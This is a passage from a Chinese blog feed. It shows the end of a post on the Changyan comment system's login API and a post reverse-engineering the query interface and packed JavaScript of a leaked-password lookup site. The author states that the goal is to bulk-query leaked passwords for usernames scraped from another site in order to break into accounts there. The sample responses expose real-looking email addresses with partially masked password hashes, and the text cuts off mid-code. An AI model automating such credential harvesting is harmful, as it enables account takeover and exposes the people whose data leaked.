class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cmt_data : &#123;20170810: 1&#125; //评论数据1条</span><br><span class="line">flood_data : &#123;20170810: 0, 20170811: 0, 20170812: 0, 20170813: 0, 20170814: 0, 20170815: 0&#125; //每天flooddata多少条</span><br><span class="line">recommender_data : &#123;&#125;</span><br><span class="line">sdk_cmt_data : &#123;&#125;</span><br><span class="line">sdk_reply_data : &#123;&#125;</span><br><span class="line">sdk_user_data : &#123;&#125;</span><br><span class="line">success : true //获取评论信息成功</span><br><span class="line">total_data : &#123;20170810: 1, 20170811: 0, 20170812: 0, 20170813: 0, 20170814: 0, 20170815: 0&#125; // 所有评论数据</span><br><span class="line">user_data : &#123;20170810: 1&#125; //用户数据1条</span><br><span class="line">wap_cmt_data : &#123;&#125; //手机评论数据</span><br><span class="line">wap_reply_data : &#123;&#125;</span><br><span class="line">wap_user_data : &#123;&#125;</span><br></pre></td></tr></table></figure> <p>对应页面如下：</p> <p><img src="/img/changyan3.png" alt="img"></p> <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>畅言登录简单，密码未做处理，安全性有待提高。</p> <p>接口不统一，评论数据需要正则匹配。</p> <p>不过为了实现自己的小功能，还是挺简单的！</p> <p>接口分析完，通过py实现以下接口。自动登录（不识别验证码，需要手动输入），然后每间隔30分钟访问一下后台页面，获取新的评论信息，如果有新的待评审数据，声音或弹窗提醒。</p> <p>完毕！</p> <p>转载请注明出处，博客原文：<a href="https://anhkgg.github.io/pylogin-changyan-login-analyze/">https://anhkgg.github.io/pylogin-changyan-login-analyze/</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;博客使用了畅言做评论系统（多说、网易云跟帖tmd相继挂了…）。&lt;br&gt;畅言后台可以看出功能非常强大，居然还有广告业务…&lt;br&gt;but，畅言登录之后，即使你选择了记住登录，也会在每次关闭浏览器后需要重新登录，很累好伐！&lt;/p&gt; &lt;p&gt;折腾了我几天之后，决定还是决定分析一下登录协议，以及简单后台操作接口，然后写个脚本跑着吧，有新评论就给我”叮”一下，就不用我常常登录去翻了！&lt;/p&gt;          </summary>            <category term="crawler" scheme="https://anhkgg.github.io/categories/crawler/"/>                 <category term="crawler" scheme="https://anhkgg.github.io/tags/crawler/"/>            <category term="python" scheme="https://anhkgg.github.io/tags/python/"/>            <category term="js" scheme="https://anhkgg.github.io/tags/js/"/>            <category term="javascript" scheme="https://anhkgg.github.io/tags/javascript/"/>            <category term="畅言" scheme="https://anhkgg.github.io/tags/%E7%95%85%E8%A8%80/"/>        </entry>      <entry>     <title>看我鼓捣华西安全网(cha.hxsec.com)密码泄露查询接口（有意思的js混淆）</title>     <link href="https://anhkgg.github.io/hxsec-search-pwd-interface-analyze/"/>     <id>https://anhkgg.github.io/hxsec-search-pwd-interface-analyze/</id>     <published>2017-08-09T15:34:25.000Z</published>     <updated>2017-08-09T22:30:22.763Z</updated>          <content type="html"><![CDATA[<h1 id="0x00-开始"><a href="#0x00-开始" class="headerlink" title="0x00 开始"></a>0x00 开始</h1><p>最近爬个站的数据，然后想扫一下其他网站的同一个账号名能否找到泄露的密码，然后在这个站嘿嘿一下…</p> <p>在 <a href="https://www.sec-wiki.com/topic/12" target="_blank" rel="noopener">sec-wiki</a> 找到了<a href="http://cha.hxsec.com/" target="_blank" rel="noopener">这个密码泄露查询网站</a>。</p> <p>随便用了一下，发现网站虽然讲密码打码了，但是某些数据还是可以猜出来原始的内容，或者通过简单的计算拿到原始的内容。</p> <p>but，我不能一个个输入然后看吧，数据虽然少，也有上千条啊，怎么说也是个python程序员，怎么也得鼓捣一下。</p> <p>分析一下hxsec的查询接口，用python批量一下。</p> <a id="more"></a> <h1 id="0x01-分析接口"><a href="#0x01-分析接口" class="headerlink" title="0x01 分析接口"></a>0x01 分析接口</h1><p>hxsec查询界面如下：<br><img src="/img/hxsec1.png" alt="img"></p> <p>其实接口很简单，f12，切换到network栏，然后随便输入什么，点击试试吧皆可以。</p> <p>看到访问的网络接口如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Request URL:http://cha.hxsec.com/ajax.php?act=select</span><br><span class="line">Request Method:POST</span><br><span class="line">Status Code:200 OK</span><br><span class="line"></span><br><span class="line">select_act:3</span><br><span class="line">match_act:2</span><br><span class="line">key:ll111</span><br><span class="line">table:212300_cxhr_zhaopin_com</span><br></pre></td></tr></table></figure> <p>参数都特别简单，<code>select_act</code>表示<code>User and Email/User/Emial</code>，<code>match_act</code>表示模糊/精确查询，key就是输入的关键字。最后一个table比较重要了，表示在什么库中查询，扫描时看到进度变化，在什么库中进行了多少了，每次搜索都会在这所有库中搜索，直到结束。</p> <p>这个数据应该存在了本地，或者初始化时服务器返回了。暂时不管，后面继续重点分析（有意思的就在这）。</p> <p>请求返回数据，有下面几种情况：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">没有返回空内容</span><br><span class="line"></span><br><span class="line">//该库只有一条数据</span><br><span class="line">addRow(&quot;ll111&quot;,&quot;348720221@qq.com&quot;,&quot;202**962AC59075B964B07152D234B70&quot;,&quot;212300_cxhr_zhaopin_com&quot;);</span><br><span class="line"></span><br><span class="line">//该库有多少数据</span><br><span class="line">addRow(&quot;&apos;fish13&apos;, &apos;fish1346@qq.com&apos;, &apos;**&apos;, &apos;mail_qq_sohu&quot;);addRow(&quot;fish13&apos;, &apos;592545012@qq.com&apos;, &apos;**&apos;, &apos;mail_qq_sohu&quot;);addRow(&quot;fish13&apos;, &apos;m_srikanth@sohu.com&apos;, &apos;**&apos;, &apos;mail_qq_sohu&apos;], [&apos;fish13&apos;, &apos;&apos;, &apos;176**1176671&apos;, &apos;qq_old_password&apos;</span><br></pre></td></tr></table></figure></p> <h1 id="0x02-分析table"><a href="#0x02-分析table" class="headerlink" title="0x02 分析table"></a>0x02 分析table</h1><p>其实接口很清楚了，但是还需要直到所有table的内容，然后才能完成所有数据搜索。</p> <p>所以，table怎么找，在哪里呢！</p> <p>还是要分析代码了…</p> <p>看看表单所在位置代码，找找搜索按钮的响应函数（这里也可以看到上面说的参数的详情），很明显响应函数是getdata。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;span class=&quot;input-group&quot;&gt;</span><br><span class="line">  &lt;select class=&quot;btn btn-success&quot; id=&quot;match_act&quot; name=&quot;match_act&quot;&gt;</span><br><span class="line">    &lt;option value=&quot;2&quot; selected=&quot;&quot;&gt;精确匹配&lt;/option&gt;</span><br><span class="line">    &lt;option value=&quot;1&quot;&gt;模糊查询&lt;/option&gt;</span><br><span class="line">  &lt;/select&gt;</span><br><span class="line"> </span><br><span class="line">  &lt;select class=&quot;btn btn-primary&quot; id=&quot;select_act&quot; name=&quot;select_act&quot;&gt;</span><br><span class="line">    &lt;option class=&quot;btn-group&quot; value=&quot;3&quot; selected=&quot;&quot;&gt;User and Email&lt;/option&gt;</span><br><span class="line">    &lt;option  class=&quot;btn-group&quot; value=&quot;1&quot;&gt;Username&lt;/option&gt;</span><br><span class="line">    &lt;option class=&quot;btn-group&quot; value=&quot;2&quot;&gt;Email&lt;/option&gt;</span><br><span class="line">  &lt;/select&gt;</span><br><span class="line">  &lt;/span&gt;&lt;/p&gt;</span><br><span class="line">  &lt;div id=&quot;jshint-pitch&quot; class=&quot;alert alert-info scan-wait&quot; style=&quot;display:none;margin-top:10px;font-size:14px&quot;&gt;  &lt;/div&gt;</span><br><span class="line">  &lt;div id=&quot;scan-result-box&quot; style=&quot;font-size:12px;&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;input-group&quot;&gt;&lt;span class=&quot;input-group-btn scan-but-span&quot;&gt;</span><br><span class="line">      &lt;button type=&quot;button&quot; class=&quot;btn btn-success&quot; onClick=&quot;getdata();&quot;&gt;试试吧!&lt;/button&gt;</span><br><span class="line">      &lt;/span&gt;</span><br><span class="line">      &lt;input placeholder=&quot;华西安全网提示：输入用户名、QQ、Email..看看你的密码是否泄露~~~请勿非法用途~~&quot;  name=&quot;key&quot; class=&quot;form-control&quot; id=&quot;key&quot; &gt;&lt;/input&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"> &lt;br&gt;</span><br></pre></td></tr></table></figure> <p>在html，js中一番搜索，tmd居然没有。<br>只在system.js中看到了这个！</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">傻逼|你TM的来打我啊|getdata|stend|u5927|</span><br></pre></td></tr></table></figure> <p><img src="/img/hxsec2.png" alt="img"></p> <p>—-手工分割线——-</p> <p>TMD的，我这暴脾气，这是挑衅啊，lz非搞你不可了！这已经上升到人身攻击了！！！</p> <p>—-手工分割线——-</p> <p>很明显，tmd代码混淆了。怎么办，调试跟呗。</p> <p>把system.js（用chrome格式化一下，不然…瞎眼）扒出来一看，其实也不复杂。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//jb 5/24修改</span><br><span class="line">eval(function(p, a, c, k, e, d) &#123;</span><br><span class="line">    e = function(c) &#123;</span><br><span class="line">        return (c &lt; a ? &quot;&quot; : e(parseInt(c / a))) + ((c = c % a) &gt; 35 ? String.fromCharCode(c + 29) : c.toString(36))</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line">    if (!&apos;&apos;.replace(/^/, String)) &#123;</span><br><span class="line">        while (c--)</span><br><span class="line">            d[e(c)] = k[c] || e(c);</span><br><span class="line">        k = [function(e) &#123;</span><br><span class="line">            return d[e]</span><br><span class="line">        &#125;</span><br><span class="line">        ];</span><br><span class="line">        e = function() &#123;</span><br><span class="line">            return &apos;\\w+&apos;</span><br><span class="line">        &#125;</span><br><span class="line">        ;</span><br><span class="line">        c = 1;</span><br><span class="line">    &#125;</span><br><span class="line">    ;while (c--)</span><br><span class="line">        if (k[c])</span><br><span class="line">            p = p.replace(new RegExp(&apos;\\b&apos; + e(c) + &apos;\\b&apos;,&apos;g&apos;), k[c]);</span><br><span class="line">    return p;</span><br><span class="line">&#125;(&apos;3o 2Y$=[&quot;&quot;,\&apos;\&apos;,\&apos;\\\\w+\&apos;,\&apos;\\\\b\&apos;,\&apos;\\\\b\&apos;,\&apos;g\&apos;,\&apos;d c$=[&quot;1W&quot;,&quot;#n&quot;,&quot;1T&quot;,&quot;1R&quot;,&quot;#n&quot;,&quot;\\\\2h\\\\2g\\\\k\\\\p&quot;,&quot; \\\\2i\\\\2k\\\\1N&quot;,&quot;%&quot;,&quot;H&quot;,&quot;H&quot;,&quot;#n&quot;,&quot;\\\\k\\\\p\\\\T\\\\O!\\\\1q\\\\1t\\\\1j\\\\1k\\\\1g\\\\G\\\\D\\\\E\\\\U\\\\W \\\\z\\\\A: &quot;,&quot;\\\\C\\\\B&quot;,&quot;#n&quot;,&quot;\\\\k\\\\p\\\\T\\\\O! \\\\U\\\\W\\\\1v:&quot;,&quot;\\\\1u \\\\z\\\\A:&quot;,&quot;\\\\C\\\\B&quot;,&quot;#n&quot;,&quot;\\\\k\\\\p\\\\T\\\\O! \\\\U\\\\W\\\\1v:&quot;,&quot;\\\\1u \\\\z\\\\A:&quot;,&quot;\\\\C\\\\B&quot;,\\\&apos;2j\\\&apos;,&quot;1D&quot;,&quot;1p=&quot;,&quot;&amp;1o=&quot;,&quot;&amp;I=&quot;,&quot;&amp;2c=&quot;,\\\&apos;1O.2b?2d=2f\\\&apos;,&quot;#H&quot;,&quot;1T&quot;,&quot;1R&quot;,&quot;#I&quot;,\\\&apos;\\\&apos;,&quot;#I&quot;,&quot;\\\\Z\\\\2e\\\\2l\\\\k\\\\p\\\\1r\\\\1n/\\\\G\\\\D\\\\E/\\\\2s\\\\2r&quot;,&quot;\\\\G\\\\D\\\\E\\\\2t\\\\1N\\\\Z\\\\2v\\\\2u!!&quot;,&quot;#1p&quot;,&quot;#1o&quot;,&quot;1C&quot;,&quot;\\\\1q\\\\1t\\\\2n\\\\1g\\\\2m\\\\1j\\\\1k\\\\2o\\\\1r\\\\1n\\\\2q&quot;,&quot;2p|2a~!1X~!1Z|a|1Y|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b&quot;];d o;d N;e 1D(1y,1U,1J,Y)&#123;d l=1C[&quot;2V&quot;]();d 1A=l[&quot;q&quot;](0);d 1I=l[&quot;q&quot;](1);d 1V=l[&quot;q&quot;](2);d 1M=l[&quot;q&quot;](3);1A[&quot;w&quot;]=1y;1I[&quot;w&quot;]=1U;1V[&quot;w&quot;]=1J;1M[&quot;w&quot;]=Y&#125;;e 1x()&#123;$( c$[0])[&quot;2U&quot;]()&#125;;e 1Q(1l,1e,1b)&#123;$( c$[1])[&quot;1z&quot;]( c$[2], c$[3]);d 1c=(1l/1e)*g;d M=X(1c,1);t[&quot;r&quot;]( c$[4],M,g, c$[5]+1b+ c$[6]+M+ c$[7])&#125;;e 1L()&#123;v=1F 1G()[&quot;1H&quot;]()-N;d 1s=R[&quot;Q&quot;]( c$[8]);d y=1s[&quot;P&quot;][&quot;f&quot;];i(y==1)&#123;d 1i=R[&quot;Q&quot;]( c$[9]);d 1m=1i[&quot;P&quot;][&quot;f&quot;];i(1m==1)&#123;t[&quot;r&quot;]( c$[10],g,g, c$[11]+(v)+ c$[12])&#125;1h&#123;t[&quot;r&quot;]( c$[13],g,g, c$[14]+(y-1)+ c$[15]+(v)+ c$[16])&#125;&#125;1h&#123;t[&quot;r&quot;]( c$[17],g,g, c$[18]+(y-1)+ c$[19]+(v)+ c$[20])&#125;&#125;;e X(1a,1d)&#123;d F=1f[&quot;2T&quot;](10,1d);S 1f[&quot;2X&quot;](1a*F)/F&#125;;e 1S(1P,s,1K,2W)&#123;$[&quot;1O&quot;](&#123;2D: c$[21],2C:1P,2E:s,2G:e(J)&#123;i(J[&quot;2F&quot;]( c$[22])&gt;=0)&#123;2B(J)&#125;;i(1K==V[&quot;f&quot;])&#123;1L()&#125;&#125;&#125;)&#125;;e 1E(j,u,x,m,h)&#123;1Q(h+1,m[&quot;f&quot;],m[h]);d s= c$[23]+u+ c$[24]+x+ c$[25]+j+ c$[26]+m[h];1S( c$[27],s,o+1,m[&quot;f&quot;]);o=o+1&#125;;e 2x()&#123;$( c$[28])[&quot;1z&quot;]( c$[29], c$[2w]);1x();d j=$( c$[2y])[&quot;K&quot;]();i(j== c$[2A])&#123;$( c$[2z])[&quot;2H&quot;]();L( c$[2P]);S 1w&#125;;i(j[&quot;f&quot;]&lt;4)&#123;L( c$[2O]);S 1w&#125;;d u=$( c$[2Q])[&quot;K&quot;]();d x=$( c$[2S])[&quot;K&quot;]();N=1F 1G()[&quot;1H&quot;]();o=0;2R(d h=0;h&lt;V[&quot;f&quot;];h++)&#123;1E(j,u,x,V,h)&#125;&#125;;e 2N()&#123;d 1B=R[&quot;Q&quot;]( c$[2J])[&quot;P&quot;][&quot;f&quot;];i(1B==0)&#123;L( c$[2I])&#125;&#125;;e 2K()&#123;d 2M= c$[2L]&#125;\&apos;,\&apos;||||||||||4U|4R|2Y|3o|3e|4Q|4T|4S|3h|54|53|56|50|52|4z|4B|4M|4O|4J|5w|5v|5q|5s|4b|4c|49|4a|4f|4g|4d|4e|48|42|43|3Z|41|46|47|3f|44|45|4h|4t|4u|3b|4r|4s|4x|4y|4v|4w|4q|||||||||||4k|4l|2Z|4i|4j|4o|4p|4m|4n|3Y|3p|3d|3u|3v|3w|3y|3A|3z|3x|3E|3F|3D|3B|3C|3s|3t|3r|3q|3R|3S|3P|3j|3Q|3T|3W|3X|3U|3V|3I|3J|3G|3H|3K|3N|3O|3L|3M|5j|5k|5h|5i|5n|||||||||||5o|5l|5m|5g|5a|5b|58|59|5e|5f|5c|5d|5A|5B|5y|5z|5E|5F|5C|5D|5x|5r|30|5p|31|33|32|3n|5t|5u|57|4K|4L|4I|39|38|4P|40|4N|4H|35|34|36|4C|37|4A|4F|4G|4D|4E\&apos;,\&apos;|\&apos;];3n(3e(3g,3d,2Z,3c,e,3f)&#123;e=3e(3a)&#123;3b(3a&lt;3d? 2Y$[0]:e(51(3a/3d)))+((3a=3a%3d)&gt;35?3i[&quot;4Z&quot;](3a+29):3a[&quot;55&quot;](36))&#125;;3h(! 2Y$[1][&quot;3k&quot;](/^/,3i))&#123;3m(2Z--)3f[e(2Z)]=3c[2Z]||e(2Z);3c=[3e(3l)&#123;3b 3f[3l]&#125;];e=3e()&#123;3b 2Y$[2]&#125;;2Z=1&#125;;3m(2Z--)3h(3c[2Z])3g=3g[&quot;3k&quot;](3j 4Y( 2Y$[3]+e(2Z)+ 2Y$[4], 2Y$[5]),3c[2Z]);3b 3g&#125;( 2Y$[6],4W,4X, 2Y$[7][&quot;4V&quot;]( 2Y$[8]),0,&#123;&#125;))&apos;, 62, 352, &apos;||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||_|somd5comf78518fb1|||||||||||somd5com21a288587|return|somd5com6d38bb14b|somd5com3de2f8f6d|function|somd5comd152c7b41|somd5comf3298c8c5|if|String|new|replace|somd5com8f18e7d16|while|eval|var|u7d22|somd5com16af76eea|somd5com6cd7bc889|somd5comed2bd7eb6|css|somd5comb9e3341a3|u5bb9|match_act|somd5com4d38b6944|select_act|u5185|u6ca1|false|get_del|u91cf|u6709|u6761|ajax|somd5come0b7918e1|somd5com4823e252c|u5ea6|get_jdt|display|somd5com811fa93b4|block|ajax_post|get_data|Date|value_tables|addRow|getTime|somd5com25f9df3a7|get_okcount|somd5com6d6674984|somd5comf49be7e59|u641c|key||somd5com9a3a7ef82|u5173|somd5_table|somd5com326e7999e|u6bd5|val|alert|somd5com956a89722|u8017|u65f6|somd5comd7f929c0a|somd5comf1d14de2e|u952e|u5b57|u79d2|u6beb|rows|somd5comf46beb405|somd5com738c8372f|somd5com3b1df0e8d|somd5comdcaedb43e|else|somd5com36f2c91c7|Math|u5230|u8bf7|u5b8c|u6570|getElementById|document|decimal|somd5com5b49d9f12|database|u636e|somd5comdd52905dc|pow|u8be2|for|somd5comb39f98f6a|round|empty|insertRow|gat_kong|focus|somd5comf53e662dd|indexOf|success|insertCell|somd5comea98952b0|progress|dataxxxx|length|SOMD5|somd5comb93c3a502|100|搜MD5|split|62|184|RegExp|fromCharCode|somd5com4af3e5365|parseInt|selecting|u67e5|somd5com490d63bb2|toString|somd5comf94f3be31|data|u5728|u6b63|u8f93|select|u8fdb|u5165|u603b|POST|act|来打我啊|SOMD55|somd5comeff53bcd1|tbody|php|table|傻逼|你TM的来打我啊|getdata|stend|u5927|innerHTML|url|type|somd5combdba21b9c|Administry|u4e8e4|u7684|操你妈|u60a8|u627e|u90ae|u957f|u5462|u7bb1&apos;.split(&apos;|&apos;), 0, &#123;&#125;));</span><br></pre></td></tr></table></figure> <p>不过直接看也挺闹人的，边调试边看吧。</p> <p>参数是什么？</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// p是字符串</span><br><span class="line">// a 是62</span><br><span class="line">// c 是 352数组大小， k 是Array[352]</span><br><span class="line">// e 是0 ， d 是&#123;&#125;</span><br></pre></td></tr></table></figure> <p>e函数干嘛了？具体返回数据暂时也不同看了，调试到了自然可以dump出来</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">e = function(c) &#123;</span><br><span class="line">  //61以内的就返回字符，0-9,a-z(11-36),A-Z(36-61)</span><br><span class="line">  //62以上</span><br><span class="line">  //c.toString(36) 36进制转为字符</span><br><span class="line">        return (c &lt; a ? &quot;&quot; : e(parseInt(c / a))) + ((c = c % a) &gt; 35 ? String.fromCharCode(c + 29) : c.toString(36))</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure> <p>然后就解密那一长串字符了，用的e<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">while (c--)</span><br><span class="line">            d[e(c)] = k[c] || e(c);</span><br></pre></td></tr></table></figure></p> <p>解出来的数据大概是这样的一个object，</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">5y: &apos;u7684&apos;</span><br><span class="line">5x: &apos;u4e8e4&apos;</span><br><span class="line">5w: &apos;Administry&apos;</span><br><span class="line">5v: &apos;somd5combdba21b9c&apos;</span><br><span class="line">5u: &apos;type&apos;</span><br><span class="line">5t: &apos;url&apos;</span><br><span class="line">5s: &apos;innerHTML&apos;</span><br><span class="line">5r: &apos;u5927&apos;</span><br><span class="line">5q: &apos;stend&apos;</span><br><span class="line">5p: &apos;getdata&apos;</span><br><span class="line">5o: &apos;你TM的来打我啊&apos;</span><br><span class="line">5n: &apos;傻逼&apos;</span><br><span class="line">5m: &apos;table&apos;</span><br><span class="line">5l: &apos;php&apos;</span><br><span class="line">5k: &apos;tbody&apos;</span><br><span class="line">5j: &apos;somd5comeff53bcd1&apos;</span><br></pre></td></tr></table></figure> <p>然后继续解，将结果返回给eval执行</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while (c--)</span><br><span class="line">        if (k[c])</span><br><span class="line">            p = p.replace(new RegExp(&apos;\\b&apos; + e(c) + &apos;\\b&apos;,&apos;g&apos;), k[c]);</span><br></pre></td></tr></table></figure> <p>直接dump结果，如下</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">var _$ = [&quot;&quot;, &apos;&apos;, &apos;\\w+&apos;, &apos;\\b&apos;, &apos;\\b&apos;, &apos;g&apos;, &apos;d c$=[&quot;1W&quot;,&quot;#n&quot;,&quot;1T&quot;,&quot;1R&quot;,&quot;#n&quot;,&quot;\\2h\\2g\\k\\p&quot;,&quot; \\2i\\2k\\1N&quot;,&quot;%&quot;,&quot;H&quot;,&quot;H&quot;,&quot;#n&quot;,&quot;\\k\\p\\T\\O!\\1q\\1t\\1j\\1k\\1g\\G\\D\\E\\U\\W \\z\\A: &quot;,&quot;\\C\\B&quot;,&quot;#n&quot;,&quot;\\k\\p\\T\\O! \\U\\W\\1v:&quot;,&quot;\\1u \\z\\A:&quot;,&quot;\\C\\B&quot;,&quot;#n&quot;,&quot;\\k\\p\\T\\O! \\U\\W\\1v:&quot;,&quot;\\1u \\z\\A:&quot;,&quot;\\C\\B&quot;,\&apos;2j\&apos;,&quot;1D&quot;,&quot;1p=&quot;,&quot;&amp;1o=&quot;,&quot;&amp;I=&quot;,&quot;&amp;2c=&quot;,\&apos;1O.2b?2d=2f\&apos;,&quot;#H&quot;,&quot;1T&quot;,&quot;1R&quot;,&quot;#I&quot;,\&apos;\&apos;,&quot;#I&quot;,&quot;\\Z\\2e\\2l\\k\\p\\1r\\1n/\\G\\D\\E/\\2s\\2r&quot;,&quot;\\G\\D\\E\\2t\\1N\\Z\\2v\\2u!!&quot;,&quot;#1p&quot;,&quot;#1o&quot;,&quot;1C&quot;,&quot;\\1q\\1t\\2n\\1g\\2m\\1j\\1k\\2o\\1r\\1n\\2q&quot;,&quot;2p|2a~!1X~!1Z|a|1Y|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b&quot;];d o;d N;e 1D(1y,1U,1J,Y)&#123;d l=1C[&quot;2V&quot;]();d 1A=l[&quot;q&quot;](0);d 1I=l[&quot;q&quot;](1);d 1V=l[&quot;q&quot;](2);d 1M=l[&quot;q&quot;](3);1A[&quot;w&quot;]=1y;1I[&quot;w&quot;]=1U;1V[&quot;w&quot;]=1J;1M[&quot;w&quot;]=Y&#125;;e 1x()&#123;$( c$[0])[&quot;2U&quot;]()&#125;;e 1Q(1l,1e,1b)&#123;$( c$[1])[&quot;1z&quot;]( c$[2], c$[3]);d 1c=(1l/1e)*g;d M=X(1c,1);t[&quot;r&quot;]( c$[4],M,g, c$[5]+1b+ c$[6]+M+ c$[7])&#125;;e 1L()&#123;v=1F 1G()[&quot;1H&quot;]()-N;d 1s=R[&quot;Q&quot;]( c$[8]);d y=1s[&quot;P&quot;][&quot;f&quot;];i(y==1)&#123;d 1i=R[&quot;Q&quot;]( c$[9]);d 1m=1i[&quot;P&quot;][&quot;f&quot;];i(1m==1)&#123;t[&quot;r&quot;]( c$[10],g,g, c$[11]+(v)+ c$[12])&#125;1h&#123;t[&quot;r&quot;]( c$[13],g,g, c$[14]+(y-1)+ c$[15]+(v)+ c$[16])&#125;&#125;1h&#123;t[&quot;r&quot;]( c$[17],g,g, c$[18]+(y-1)+ c$[19]+(v)+ c$[20])&#125;&#125;;e X(1a,1d)&#123;d F=1f[&quot;2T&quot;](10,1d);S 1f[&quot;2X&quot;](1a*F)/F&#125;;e 1S(1P,s,1K,2W)&#123;$[&quot;1O&quot;](&#123;2D: c$[21],2C:1P,2E:s,2G:e(J)&#123;i(J[&quot;2F&quot;]( c$[22])&gt;=0)&#123;2B(J)&#125;;i(1K==V[&quot;f&quot;])&#123;1L()&#125;&#125;&#125;)&#125;;e 1E(j,u,x,m,h)&#123;1Q(h+1,m[&quot;f&quot;],m[h]);d s= c$[23]+u+ c$[24]+x+ c$[25]+j+ c$[26]+m[h];1S( c$[27],s,o+1,m[&quot;f&quot;]);o=o+1&#125;;e 2x()&#123;$( c$[28])[&quot;1z&quot;]( c$[29], c$[2w]);1x();d j=$( c$[2y])[&quot;K&quot;]();i(j== c$[2A])&#123;$( c$[2z])[&quot;2H&quot;]();L( c$[2P]);S 1w&#125;;i(j[&quot;f&quot;]&lt;4)&#123;L( c$[2O]);S 1w&#125;;d u=$( c$[2Q])[&quot;K&quot;]();d x=$( c$[2S])[&quot;K&quot;]();N=1F 1G()[&quot;1H&quot;]();o=0;2R(d 